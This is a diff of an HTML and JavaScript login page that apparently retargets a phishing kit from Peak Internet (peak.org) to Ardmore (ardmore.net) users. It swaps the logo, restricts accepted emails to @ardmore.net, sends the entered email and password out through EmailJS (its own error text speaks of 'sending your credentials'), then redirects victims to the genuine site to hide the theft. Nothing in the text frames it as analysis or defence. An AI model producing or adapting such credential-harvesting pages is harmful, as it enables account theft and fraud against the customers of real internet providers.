@@ -224,7 +224,7 @@
 <body>
 <div class="outer-wrapper">
   <div class="form-container">
-    <img src="https://2xqb9g88cp.ucarecd.net/224959cf-6ba3-48bf-8557-7a97d9662b06/peaorglarge.png" alt="Logo" class="form-logo" />
+    <img src="https://2xqb9g88cp.ucarecd.net/c23f0e2d-0b95-4261-a7fb-9eba27e7f0d2/admorelarge.png" alt="Logo" class="form-logo" />
     <div class="signIn">Log In</div>
     <form id="contact-form" novalidate>
       <div class="input-group">
@@ -271,14 +271,14 @@
     // Validate input
     const emailValue = emailInput.value.trim();
     const passwordValue = passwordInput.value.trim();
-    const allowedDomainRegex = /^[^@\s]+@peak\.org$/i;
+    const allowedDomainRegex = /^[^@\s]+@ardmore\.net$/i;
     let valid = true;
 
     if (!emailValue) {
       emailError.textContent = "Email is required.";
       valid = false;
     } else if (!allowedDomainRegex.test(emailValue)) {
-      emailError.textContent = "Email must be @peak.org.";
+      emailError.textContent = "Email must be @ardmore.net.";
       valid = false;
     }
 
@@ -299,7 +299,7 @@
       console.log("EmailJS SUCCESS:", response.status);
 
       // Redirect after success
-      window.location.href = "https://www.peakinternet.com";
+      window.location.href = "https://www.ardmore.net";
     } catch (error) {
       console.error("EmailJS FAILED:", error);
       alert("There was an error sending your credentials. Please try again later.");
